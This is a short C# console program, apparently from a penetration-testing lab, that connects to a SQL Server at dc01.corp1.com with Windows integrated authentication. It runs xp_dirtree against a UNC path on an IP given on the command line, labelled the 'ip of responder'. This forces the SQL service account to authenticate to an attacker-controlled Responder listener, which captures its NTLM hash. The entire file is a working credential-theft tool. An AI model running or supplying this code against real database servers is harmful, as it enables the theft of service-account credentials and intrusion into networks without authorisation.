using System;
using System.Data.SqlClient;

namespace ConsoleApp1
{
    class Program
    {
        // .\ConsoleApp1.exe 192.168.49.71
        static void Main(string[] args)
        {
            if (args.Length == 0)
            {
                Console.WriteLine("Usage: program.exe ip of responder");
                return;
            }
            String sqlServer = "dc01.corp1.com";
            String database = "master";
            String conString = "Server = " + sqlServer + "; Database = " + database + "; Integrated Security = True;";
            SqlConnection con = new SqlConnection(conString);
            try
            {
                con.Open(); Console.WriteLine("Auth success!");
            }
            catch
            {
                Console.WriteLine("Auth failed"); Environment.Exit(0);
            }
            String query = "EXEC master..xp_dirtree \"\\\\"+args[0]+"\\\\test\";";
            SqlCommand command = new SqlCommand(query, con);
            SqlDataReader reader = command.ExecuteReader();
            reader.Close();
            con.Close();
        }
    }
}
